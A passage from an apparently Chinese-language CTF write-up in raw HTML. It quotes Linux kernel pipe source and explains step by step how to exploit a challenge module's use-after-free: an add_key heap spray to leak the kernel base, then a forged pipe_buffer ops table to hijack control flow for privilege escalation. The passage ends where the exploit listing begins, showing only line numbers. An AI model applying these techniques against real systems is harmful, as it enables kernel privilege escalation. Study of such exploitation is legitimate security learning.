class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br><span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> error;<br><br>error = __do_pipe_flags(fd, files, flags);<br><span class="hljs-keyword">if</span> (!error) &#123;<br><span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>fput(files[<span class="hljs-number">0</span>]);<br>fput(files[<span class="hljs-number">1</span>]);<br>put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>error = -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br>SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>他分为两种pipe系统调用，分别为<code>pipe</code>和<code>pipe2</code>，其区别就是flags的区别，最终调用了<code>do_pipe2</code>函数，其调用链如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>get_pipe_inode <span class="hljs-comment">//对于该管道inode的fops赋值为pipefifo_fops</span><br><span class="hljs-function">alloc_pipe_info</span><br><span class="hljs-function"><span class="hljs-title">kzalloc</span><span class="hljs-params">(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT</span></span><br><span class="hljs-params"><span class="hljs-function">kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><br>    ...<br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer), GFP_KERNEL_ACCOUNT);<br><br>...<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS16</span><br></code></pre></td></tr></table></figure><p>可以看到最终的链条会分配一个pipe_inode_info大小的结构体,他的块会从kmalloc-192入手，</p><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *@head: The point of buffer production</span><br><span class="hljs-comment"> *@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: cached released page</span><br><span class="hljs-comment"> *@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: reader counter</span><br><span class="hljs-comment"> *@w_counter: writer counter</span><br><span class="hljs-comment"> *@poll_usage: is this pipe used for epoll, which has crazy wakeups?</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *@user: the user who created this pipe</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-type">bool</span> poll_usage;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span> <span class="hljs-comment">//存放pipe_buffer数组</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><p>然后调用kcalloc分配pipe_buffer，分配块大小为<code>pipe_bufs * sizeof(struct pipe_buffer)</code>,其中pipe_bufs默认为16，他将会从kmalloc-1k进行取obj,所以如果我们控制了pipe_inode_info,那么我们就可以获取该动态分配的堆块值，也就是pipe_inode_info-&gt;bufs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>上述结构体可以保证我们泄露出内核堆地址，但这还不够，我们甚至可以利用它来控制执行流，</p><p>下面来分析该pipe的释放过程：</p><p>我们上面知道，管道创建后有两个文件描述符，一个读一个写，所以当这两个文件描述符都被关闭的时候就会正式的关闭管道</p><p>要分析资源释放的过程，我们需要知道他的释放函数，当我们释放文件描述符的时候，程序员并不会管你这个文件是管道还是什么，与关闭其他文件唯一不同的就是inode的释放函数，我们在上面获取pipe的途中调用了get_pipe_inode,其中便对于其指针进行了赋值，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br>...<br><br>inode-&gt;i_fop = &amp;pipefifo_fops;<br><br>...<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>可以知道该管道的release函数指针被赋值为<code>pipe_release</code>函数，其调用链如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">pipe_release</span><br><span class="hljs-variable">put_pipe_info</span><br><span class="hljs-variable">free_pipe_info</span><br><span class="hljs-variable">pipe_buf_release</span><br><span class="hljs-variable">pipe_buffer.ops</span>-&gt;<span class="hljs-function"><span class="hljs-title">release</span>(<span class="hljs-variable">pipe_buf_release</span>)</span><br></code></pre></td></tr></table></figure><p>可以看到最终是调用了pipe_buffer.ops上的函数，因此如果我们可以修改pipe_buffer上面的函数表，那么我们就可以在释放管道两个文件的时候成功的控制我们的程序流</p><h4 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h4><p>下面是pipe_buffer的函数表:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note on the nesting of these functions:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -&gt;confirm()</span><br><span class="hljs-comment"> *-&gt;try_steal()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * That is, -&gt;try_steal() must be called on a confirmed buffer.  See below for</span><br><span class="hljs-comment"> * the meaning of each operation.  Also see the kerneldoc in fs/pipe.c for the</span><br><span class="hljs-comment"> * pipe and generic variants of these hooks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="6-漏洞利用"><a href="#6-漏洞利用" class="headerlink" title="6.漏洞利用"></a>6.漏洞利用</h3><p>前面铺垫了一大段相关知识，总算是可以到我们的正题了，回忆一下题目中的条件</p><ol><li>存在ioctl系统调用，其中根据我们传递的cmd来判断，如果是0xdeadbeef，则分配堆块，若是0xc0decafe，则释放堆块,且该释放堆块存在悬垂指针，也就是有UAF</li><li>堆块存放的idx只能为0或1</li><li>题目开启kalsr，smep&#x2F;smap，kpti</li></ol><p>我们首先需要考虑的是地址泄露</p><h4 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h4><p>我们利用到堆喷的思路以及add_key系统调用的利用,当我们在利用add_key来获取了一个key_id的时候，我们就可以通过keyctl系统调用来对他进行操作，其中的详细部分可以参考上面所讲。</p><p>当key中的payload被释放过后，其中的user_key_payload-&gt;rcu-&gt;callback_head函数指针会被修改为<code>user_free_payload_rcu</code>,而他是一个全局变量，所以当我们释放过后通过UAF漏洞就可以泄露出内核的基地址了，</p><p>下面便是本题当中内核堆喷以及泄露的详细过程：</p><ol><li>首先构建UAF obj，也就是说利用漏洞模块中的ioctl来创建一个obj并释放掉他，此时我们要注意到该obj的指针是并没有置空的，我们仍可以继续使用，并且这里的大小为了配合后面的add_key系统调用，所以统一分配kmalloc-192（这里使用别的也可以</li><li>堆喷user_key_payload,由于我们知道，add_key系统调用需要先临时分配一个obj来存放payload，然后再分配一个(payload+head)的obj来存放user_key_payload,最后再释放掉上面一个临时堆块，所以我们的UAF obj会不停的被分配为临时payload然后释放，这将导致我们一直无法使得UAF obj被分配成user_key_payload</li><li>步骤2中的情况一直持续到该slab全被耗空，此时假设slab当中就只剩下刚刚释放掉的临时堆块，此时我们再次add_key,这将导致UAF obj再次被分配为临时payload，但是，<strong>这里发现该slab没有剩余的obj来分配给user_key_payload,那么题目会把当前正在使用的slab存放回slab当中，并且从kmem_cache_node中搜寻partial slab来放置回kmem_cache_cpu-&gt;freelist当中，这样一来我们的user_key_payload将从新的slab当中分配，分配完毕后，我们的临时payload，也就是UAF obj将被放回node当中作为partial slab存在</strong></li><li>我们继续堆喷user_key_payload,与上面的堆喷有所不同的是，<strong>此次的临时存放payload的obj将不再使用UAF obj进行分配，因为此时的UAF obj不在cpu-&gt;freelist下，而是在node当中</strong>，因此同样当我们堆喷到slab当中只存在一个唯一的刚刚释放的临时payload堆块时，<strong>我们将从node中搜寻partial slab来进行分配，而我们刚刚置入node的那个partial slab就是存放着咱们空闲UAF obj的那个slab，因此此时将会把刚刚那个partial slab作为咱们新的cpu-&gt;freelist来进行分配，所以就达成了将我们的UAF obj分配为user_key_payload的过程</strong></li><li>此时我们为了之后可以成功泄露出基地址，这里我们需要将UAF obj所在的user_key_payload的head中datalen修改为更大的值，从而使得在keyctl_read的时候可以读到其他user_key_payload的值，而其他user_key_payload如果释放掉了payload，那么就可以从中泄露出基地址，所以此时我们首先释放UAF obj，然后开始利用漏洞模块的ioctl来进行堆喷，其中传入的buf对应user_key_payload的datalen字段的部分需要我们改大，此时当我们成功分配到之前释放的UAF obj的时候，就会将其对应的user_key_payload中的datalen进行修改</li><li>经过步骤五，我们已经将user_key_payload的datalen字段修改，但我们如何找到对应的key_id来进行泄露呢，这里有个keyctl_read，当我们读入buf之后，他的返回值不难分析得知就是user_key_payload-&gt;datalen，所以我们可以通过循环遍历，若该值大于我们之前分配的192，那么就说明他就是我们刚刚利用UAF obj改过的user_key_payload,在遍历的过程中，我们把其他的payload都利用keyctl_revoke进行释放，这样一来我们就可以通过越界读victim user_key_payload来读取其他payload头当中的全局指针了</li></ol><h4 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h4><p>我们在这里利用pipe进行劫持</p><p>当我们创建一个pipe管道过后，由上面的源码可以得知，在分配pipe的过程当中，他会从kmalloc-192当中分配一个pipe_inode_info结构体，并且在pipe_inode_info-&gt;bufs字段分配一个pipe_buffer数组(这里就可以说明他包含泄露内核堆地址的功能)，从kmalloc-1k当中分配，并且当我们释放掉管道的两端的时候，就会调用pipe_buffer中*ops表的release()函数，这里我们就可以伪造他的一个函数表进行控制，下面是详细步骤</p><ol><li>利用两个可以共存在漏洞模块数组的堆块，我们可以轻松的将obj1分配为一个user_key_payload,这里是为了pipe_inode_info所生成</li><li>然后我们分配obj0为一个1024的大块，将从kmalloc-1k中获取，然后释放掉他，这保证了我们之后分配pipe_buffer将会利用该obj进行分配，同时也释放掉obj1，这里的理由一致</li><li>调用pipe系统调用，这将使得我们obj0，obj1分别被分配为pipe_buffer和pipe_inode_info</li><li>此时我们的pipe_inode_info和user_key_payload都同时使用一个obj1进行分配，此时我们调用keyctl_read，传入size为0xffff来读我们二点pipe_inode_info,这将使得我们obj1中对应datalen字段变大，但经过测试是0x2000左右，此时我们就可以通过他来知道我们pipe_buffer的地址，然后我们此时可以通过释放obj0，分配obj0来达成修改pipe_buffer并且在上面伪造函数表的功能</li><li>最后释放两个文件描述符，来达成我们的提权</li></ol><p>这里的gadgets寻找十分困难，在内核中寻找gadget不同于以往，uesrland中的gadgets可能普遍较短就可以使用，但是内核的话在一般使用ROPgadget，ropper等无法寻找到相应堆块，因为按照国资师傅所说，gadget的列出是按照rip的改变作为结束点的，大概就是主动修改rip作为结束，所以在一些内核中较长的gadgets，涉及到多次rip变换就无法显现，奇怪的是利用objdump同样无法显出，因此经过mole师傅的指点，可以利用ROPgadget的另一个功能</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ROPgadget --binary<span class="hljs-attribute">&lt;文件名&gt;</span> --opcode <span class="hljs-attribute">&lt;16进制汇编码&gt;</span><br></code></pre></td></tr></table></figure><p>还有个注意点那就是pipe_inode_info中，bufs字段的偏移为0x98，经过调试可以得出</p><p>本题实际上在控制流劫持当中就可以看出有更简便的方法，但是本节的主要部分是学习堆喷的步骤，因此就按着arttnba3师傅的节奏来</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/728da9773912b31bb3e93819c018367adab4e17d.jpg"></p><p>以下是exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span 